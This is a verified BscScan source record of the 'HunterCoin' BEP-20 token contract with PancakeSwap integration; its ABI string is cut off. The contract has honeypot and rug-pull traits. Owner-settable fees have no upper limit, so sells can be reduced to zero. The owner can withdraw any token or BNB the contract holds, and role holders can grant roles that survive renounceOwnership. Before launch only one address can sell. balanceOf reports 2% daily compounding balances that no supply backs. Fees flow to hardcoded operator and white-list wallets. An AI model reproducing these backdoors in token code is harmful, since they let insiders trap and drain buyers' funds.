{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2022-02-05\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2021-12-03\r\n*/\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.6.12;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address public _owner;\r\n    mapping(address => bool) private _roles;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () internal {\r\n        _owner = _msgSender();\r\n        _roles[_msgSender()] = true;\r\n        emit OwnershipTransferred(address(0), _msgSender());\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_roles[_msgSender()]);\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _roles[_owner] = false;\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _roles[_owner] = false;\r\n        _roles[newOwner] = true;\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function setOwner(address addr, bool state) public onlyOwner {\r\n        _owner = addr;\r\n        _roles[addr] = state;\r\n    }\r\n\r\n}\r\n\r\n\r\ninterface IPancakeRouter01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IPancakeRouter02 is IPancakeRouter01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\r\n    function allPairs(uint) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ncontract Token is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    mapping(address => uint256) private _balance;\r\n    mapping(address => uint256) private _profitBaseBlockNum;\r\n\r\n    address[30] public _whiteList;\r\n\r\n    address[25] public _topUserList;\r\n    uint256 public _topUserListNum;\r\n\r\n    mapping(address => bool) private _isExcludedReward;\r\n    mapping(address => bool) private _isExcludedFromFee;\r\n\r\n    string private _name = \"HunterCoin\";\r\n    string private _symbol = \"HTC\";\r\n    uint8  private _decimals = 18;\r\n    uint256 private _totalSupply = 5600000000 ether;\r\n\r\n    uint256 public _buyBurnFee = 5;\r\n    uint256 public _sellBurnFee = 15;\r\n\r\n    uint256 public _liquidityFee = 30;\r\n\r\n    uint256 public _rewardFee = 20;\r\n\r\n    uint256 public _whiteFee = 20;\r\n\r\n    uint256 public _activateTime = 0;\r\n\r\n    address public burnAddress = address(0x0000000000000000000000000000000000000000);\r\n\r\n    address public usdtToken = address(0x55d398326f99059fF775485246999027B3197955);\r\n\r\n    address public operationAddress = address(0x60Ff6Acd28ff70563D0c45B8ed71E00d2E2297F0);\r\n\r\n    address public onlineAddress = address(0x97408f9958A324c49FDf5Dd51ac5b79BEE156755);\r\n\r\n    IPancakeRouter02 public swapRouter;\r\n    address public swapPair;\r\n\r\n    uint256 private numTokensSellLimit = 10000 ether;\r\n    uint256 private numTokensSellToTopLimit = 100000 ether;\r\n\r\n    uint256 public numTokensSellToAddToLiquidity;\r\n    uint256 public numTokensSellToTopUser;\r\n    uint256 public numTokensSellToWhiteList;\r\n\r\n    //pancakeSwap mainnet contract address\r\n    address public routerV2Address = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    //deploy on zeroTime\r\n    uint256 public genesisBlockNum = block.number;\r\n    uint256 public fiveMinutesBlockNum = 100;\r\n    uint256 public oneDayBlockNum = 28800;\r\n    uint256 public oneHourBlockNum = 1200;\r\n\r\n    uint256 public endBlockNum;\r\n\r\n    //* 00 include baseNum rate\r\n    uint256 public perDayRate = 2;\r\n    //* 0000 include baseNum rate\r\n    uint256 public perHourRate = 8;\r\n\r\n    uint256 public onlineBlockNum;\r\n\r\n    //sell & buy genesis fee\r\n    uint256 public buyAndSellGenesisFee = 40;\r\n    uint256 public reduceGenesisFee = 20;\r\n\r\n    uint256 public _burnFeeTotal;\r\n\r\n    constructor () public {\r\n        _balance[owner()] = _totalSupply;\r\n\r\n        endBlockNum = block.number.add(60 * oneDayBlockNum);\r\n\r\n        IPancakeRouter02 _router = IPancakeRouter02(routerV2Address);\r\n        swapPair = IUniswapV2Factory(_router.factory()).createPair(address(this), address(usdtToken));\r\n        swapRouter = IPancakeRouter02(_router);\r\n\r\n        _profitBaseBlockNum[owner()] = block.number;\r\n\r\n        _whiteList[0] = 0x7cBd33C3cc396E4228828D845D213ce422148438;\r\n        _whiteList[1] = 0x017432ce05a504B0078BCD99Cd7d555339E16F0b;\r\n        _whiteList[2] = 0xcF07e564500DC44977Ab90bd5E0064030E66f962;\r\n        _whiteList[3] = 0x3B50e2330264ed17e06FCEA96AF0C273c0204816;\r\n        _whiteList[4] = 0x5Cc1668A8bcfC42C91498047819fa57c25044698;\r\n        _whiteList[5] = 0xB22cFCa2D2907Aef50B368D8C63dE0ADC58F4Ab9;\r\n        _whiteList[6] = 0xEeBBFf7c2873f4703Ee2BbC14303c21444F4786F;\r\n        _whiteList[7] = 0x27C613B75c07A2D47a0DCD74372A877988fcc9de;\r\n        _whiteList[8] = 0x7BdC9Ae78ADfC14f12D887C2dee766fC13c10a62;\r\n        _whiteList[9] = 0x4B06ba6C1Eb3496F757E3cA12454679d89030DFC;\r\n        _whiteList[10] = 0xB7A5781DE1aEA2F3849a30037A2357BAB71781dA;\r\n        _whiteList[11] = 0x909E899E39577473A84fFA43a86071138DA858dB;\r\n        _whiteList[12] = 0xE93e952452EC80124304d9D811FBa46ABF4a4718;\r\n        _whiteList[13] = 0xe2f266CeE81A3E5b345ac20ADDa53a7f34e90ea3;\r\n        _whiteList[14] = 0x763017d843FcCD47A79813474b6D5E4b85bba7Cd;\r\n        _whiteList[15] = 0xD8937F9E8a225e0CdAd725b706094f25A959c4f3;\r\n        _whiteList[16] = 0xDD7Ad1B2154FD91117acD96229A74EB16ADc5b02;\r\n        _whiteList[17] = 0xf9Af5f25e50Bd7EbB8db7980972F46c3806778e0;\r\n        _whiteList[18] = 0x82Bc053166754B9B95C3c540d67fa2184f98237a;\r\n        _whiteList[19] = 0xddb1203E869EDB39E2fBe3Fa6D9FF350bE8Bc100;\r\n        _whiteList[20] = 0x7F346cf4929257885Ddd5E3C007c07EC5F4CF901;\r\n        _whiteList[21] = 0xb71BB907a9F46df5feE754eBE9FaAab0A80DEb14;\r\n        _whiteList[22] = 0x05D4E11625dAAb482EdbdeEDC001f0c9eD843d11;\r\n        _whiteList[23] = 0x461291F35a2e4fd8Fbe7ea13Fe9203706c1B21e4;\r\n        _whiteList[24] = 0xf6F2A7A822F2a5A3ee2f3E1d2C38e8b9829031B0;\r\n        _whiteList[25] = 0x48C985d18178dcdc0F60Ff00E7125996a5dbA03B;\r\n        _whiteList[26] = 0x79f7C8e168f4EFa04C6B2C59769bB82c8827ffBb;\r\n        _whiteList[27] = 0x69E49B95C791366A6280E74085E6706E9F068688;\r\n        _whiteList[28] = 0xaD4107eE5a617dDB165f5D68652a540c7429B0D0;\r\n        _whiteList[29] = 0x28EbfcB21D42c2c8A2f76F958eB76CE2E2707887;\r\n\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        uint256 amount = _balance[account];\r\n        if (amount == 0) {\r\n            return 0;\r\n        }\r\n        (uint256 profitDays,uint256 profitHours) = getProfitTime(account);\r\n        for (uint i = 0; i < profitDays; i++) {\r\n            amount += amount * perDayRate / 100;\r\n        }\r\n        for (uint j = 0; j < profitHours; j++) {\r\n            amount += amount * perHourRate / 10000;\r\n        }\r\n        return amount;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function topUserReward(uint256 rewardAmount) private {\r\n        swapTokensForUsdt(rewardAmount);\r\n        IERC20(usdtToken).transferFrom(operationAddress, address(this), IERC20(usdtToken).balanceOf(address(operationAddress)));\r\n        uint256 perReward = IERC20(usdtToken).balanceOf(address(this)).div(_topUserListNum);\r\n        for (uint i = 0; i < _topUserListNum; i++) {\r\n            IERC20(usdtToken).transfer(_topUserList[i], perReward);\r\n        }\r\n    }\r\n\r\n    function syncBalance(address account, uint256 amount, bool flag) private {\r\n        if (flag) {\r\n            _balance[account] = balanceOf(account).add(amount);\r\n        } else {\r\n            if (balanceOf(account) > amount) {\r\n                _balance[account] = balanceOf(account).sub(amount);\r\n            } else {\r\n                _balance[account] = 0;\r\n            }\r\n        }\r\n        _profitBaseBlockNum[account] = block.number;\r\n    }\r\n\r\n    function getTopUserList() public view returns (address[25] memory){\r\n        return _topUserList;\r\n    }\r\n\r\n    function setTopUserList(address _addr, uint _sort) public onlyOwner {\r\n        _topUserList[_sort] = _addr;\r\n        if (_topUserListNum < 24) {\r\n            _topUserListNum++;\r\n        }\r\n    }\r\n\r\n    function whiteListReward(uint256 amount) private {\r\n        swapTokensForUsdt(amount);\r\n        IERC20(usdtToken).transferFrom(operationAddress, address(this), IERC20(usdtToken).balanceOf(address(operationAddress)));\r\n        uint256 perReward = IERC20(usdtToken).balanceOf(address(this)).div(30);\r\n        for (uint i = 0; i < 30; i++) {\r\n            IERC20(usdtToken).transfer(_whiteList[i], perReward);\r\n        }\r\n    }\r\n\r\n    function setRouter(address _swapPair) public onlyOwner {\r\n        swapPair = _swapPair;\r\n        onlineBlockNum = block.number;\r\n    }\r\n\r\n    function setOnline() public onlyOwner {\r\n        onlineBlockNum = block.number;\r\n    }\r\n\r\n    function getGenesisFee() public view returns (uint256){\r\n        uint256 currentBlockNum = block.number;\r\n        uint256 times = currentBlockNum.sub(onlineBlockNum).div(fiveMinutesBlockNum);\r\n        uint256 genesisFee = times * reduceGenesisFee;\r\n        if (buyAndSellGenesisFee > genesisFee) {\r\n            return buyAndSellGenesisFee.sub(genesisFee);\r\n        } else {\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    function getProfitTime(address account) public view returns (uint256, uint256){\r\n        uint256 currentBlockNum = block.number > endBlockNum ? endBlockNum : block.number;\r\n        uint256 accountBlockNum = _profitBaseBlockNum[account];\r\n        if (accountBlockNum == 0) {\r\n            return (0, 0);\r\n        }\r\n        if (currentBlockNum > accountBlockNum) {\r\n            return (currentBlockNum.sub(accountBlockNum).div(oneDayBlockNum),\r\n            ((currentBlockNum.sub(accountBlockNum)) % oneDayBlockNum).div(oneHourBlockNum));\r\n        } else {\r\n            return (0, 0);\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function totalBurn() public view returns (uint256) {\r\n        return _burnFeeTotal;\r\n    }\r\n\r\n    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {\r\n        _liquidityFee = liquidityFee;\r\n    }\r\n\r\n    function setRewardFeePercent(uint256 rewardFee) external onlyOwner() {\r\n        _rewardFee = rewardFee;\r\n    }\r\n\r\n    function setBuyBurnFeePercent(uint256 burnFee) external onlyOwner() {\r\n        _buyBurnFee = burnFee;\r\n    }\r\n\r\n    function setSellBurnFeePercent(uint256 burnFee) external onlyOwner() {\r\n        _sellBurnFee = burnFee;\r\n    }\r\n\r\n    function setWhiteFeePercent(uint256 whiteFee) external onlyOwner() {\r\n        _whiteFee = whiteFee;\r\n    }\r\n\r\n    function setEthWith(address addr, uint256 amount) public onlyOwner {\r\n        payable(addr).transfer(amount);\r\n    }\r\n\r\n    function setErc20With(address con, address addr, uint256 amount) public onlyOwner {\r\n        IERC20(con).transfer(addr, amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from, address to, uint256 amount\r\n    ) private {\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        require(balanceOf(from) >= amount, \"Insufficient balance\");\r\n\r\n        uint256 burnAmount;\r\n        uint256 lastAmount = amount;\r\n        uint256 addAmount;\r\n        uint256 subAmount;\r\n        bool takeFee = false;\r\n        if (from != address(this) && to != address(this)) {\r\n\r\n            if (onlineBlockNum == 0) {\r\n                //off\r\n                if (to == swapPair) {\r\n                    require(from == onlineAddress);\r\n                }\r\n            }\r\n            if (from == swapPair) {\r\n                //buy\r\n                burnAmount = amount.mul(_buyBurnFee).div(1000);\r\n                takeFee = true;\r\n            } else if (to == swapPair) {\r\n                //sell\r\n                burnAmount = amount.mul(_sellBurnFee).div(1000);\r\n                takeFee = true;\r\n            }\r\n\r\n            if (takeFee) {\r\n                uint256 genesisAmount = amount.mul(getGenesisFee()).div(1000);\r\n                syncBalance(burnAddress, genesisAmount.add(burnAmount), true);\r\n                emit Transfer(from, burnAddress, genesisAmount.add(burnAmount));\r\n\r\n                _burnFeeTotal = _burnFeeTotal.add(genesisAmount).add(burnAmount);\r\n\r\n                uint256 lpAmount = amount.mul(_liquidityFee).div(1000);\r\n                addAmount += lpAmount;\r\n                if (numTokensSellToAddToLiquidity >= numTokensSellLimit) {\r\n                    swapAndLiquify(numTokensSellToAddToLiquidity);\r\n                    subAmount += numTokensSellToAddToLiquidity;\r\n                    numTokensSellToAddToLiquidity = 0;\r\n                }\r\n                numTokensSellToAddToLiquidity += lpAmount;\r\n\r\n                uint256 rewardAmount = amount.mul(_rewardFee).div(1000);\r\n                addAmount += rewardAmount;\r\n                if (numTokensSellToTopUser >= numTokensSellToTopLimit) {\r\n                    if (_topUserListNum > 0) {\r\n                        topUserReward(numTokensSellToTopUser);\r\n                        subAmount += numTokensSellToTopUser;\r\n                        numTokensSellToTopUser = 0;\r\n                    }\r\n                }\r\n                numTokensSellToTopUser += rewardAmount;\r\n\r\n                uint256 whiteAmount = amount.mul(_whiteFee).div(1000);\r\n                addAmount += whiteAmount;\r\n                if (numTokensSellToWhiteList >= numTokensSellLimit) {\r\n                    whiteListReward(numTokensSellToWhiteList);\r\n                    subAmount += numTokensSellToWhiteList;\r\n                    numTokensSellToWhiteList = 0;\r\n                }\r\n                numTokensSellToWhiteList += whiteAmount;\r\n\r\n                uint256 feeAmount = genesisAmount.add(burnAmount);\r\n                feeAmount = feeAmount.add(lpAmount).add(rewardAmount).add(whiteAmount);\r\n                lastAmount = amount > feeAmount ? amount.sub(feeAmount) : 0;\r\n\r\n                //                syncBalance(address(this), subAmount, false);\r\n                //                syncBalance(address(this), addAmount, true);\r\n                _balance[address(this)] += addAmount;\r\n            }\r\n        }\r\n\r\n        syncBalance(from, amount, false);\r\n        syncBalance(to, lastAmount, true);\r\n        emit Transfer(from, to, lastAmount);\r\n    }\r\n\r\n    function swapAndLiquify(uint256 contractTokenBalance) private {\r\n        uint256 half = contractTokenBalance.div(2);\r\n        uint256 otherHalf = contractTokenBalance.sub(half);\r\n\r\n        uint256 initialBalance = IERC20(usdtToken).balanceOf(address(operationAddress));\r\n\r\n        // swap tokens for USDT\r\n        swapTokensForUsdt(half);\r\n\r\n        // how much USDT did we just swap into?\r\n        uint256 newBalance = IERC20(usdtToken).balanceOf(address(operationAddress)).sub(initialBalance);\r\n\r\n        // add liquidity to uniswap\r\n        addLiquidity(otherHalf, newBalance);\r\n    }\r\n\r\n    function swapTokensForUsdt(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(usdtToken);\r\n\r\n        _approve(address(this), routerV2Address, tokenAmount);\r\n\r\n        // make the swap\r\n        swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            operationAddress,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), routerV2Address, tokenAmount);\r\n        IERC20(usdtToken).transferFrom(operationAddress, address(this), usdtAmount);\r\n        IERC20(usdtToken).approve(routerV2Address, usdtAmount);\r\n\r\n        // add the liquidity\r\n        swapRouter.addLiquidity(\r\n            address(this),\r\n            address(usdtToken),\r\n            tokenAmount,\r\n            usdtAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            operationAddress,\r\n            block.timestamp\r\n        );\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_activateTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_burnFeeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_rewardFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_topUserList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_topUserListNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_whiteFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_whiteList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAndSellGenesisFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"u